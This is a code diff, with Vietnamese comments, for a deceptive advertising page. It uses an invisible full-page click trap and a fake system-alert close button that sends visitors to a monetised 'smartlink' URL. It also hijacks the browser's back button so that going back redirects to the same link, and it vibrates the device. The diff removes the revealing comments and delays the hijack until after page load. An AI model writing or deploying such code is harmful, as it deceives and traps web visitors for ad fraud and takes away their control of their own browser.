@@ -14,7 +14,6 @@
         
         #trap { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 9999; cursor: pointer; background: rgba(0,0,0,0); }
 
-        /* NÚT X GIẢ - TRÔNG NHƯ THÔNG BÁO HỆ THỐNG */
         #fake-alert {
             position: fixed; top: 20%; left: 50%; transform: translateX(-50%);
             width: 90%; max-width: 350px; background: #fff; color: #000;
@@ -75,27 +74,28 @@
     <script>
         var sLink = "https://evacuateenclose.com/zv12wf4v?key=7ffa37a8342c5fb3d04743a7015d7566";
 
-        // CLICK VÀO NÚT X GIẢ LÀ ĂN SMARTLINK
+        // Click nút X giả
         function triggerLỏ() {
             window.location.href = sLink;
         }
 
-        // CLICK VÀO TRAP NỔ POPUNDER
+        // Bẫy tàng hình - Thêm {passive: true} để mượt hơn
         document.getElementById('trap').addEventListener('click', function() {
             this.style.display = 'none';
-        });
+        }, {passive: true});
 
-        // BACK BUTTON HIJACK
-        (function() {
-            history.pushState(null, document.title, location.href);
-            window.addEventListener('popstate', function () {
-                window.location.assign(sLink);
-            });
-        })();
-
-        // RUNG MÁY
+        // Chỉ kích hoạt mấy cái trick nặng sau khi load xong 1s
         window.addEventListener('load', function() {
-            if (navigator.vibrate) navigator.vibrate([100, 50, 100]);
+            setTimeout(function() {
+                // Rung máy
+                if (navigator.vibrate) navigator.vibrate([100, 50, 100]);
+
+                // Back Hijack
+                history.pushState(null, document.title, location.href);
+                window.addEventListener('popstate', function () {
+                    window.location.assign(sLink);
+                });
+            }, 1000);
         });
     </script>
 
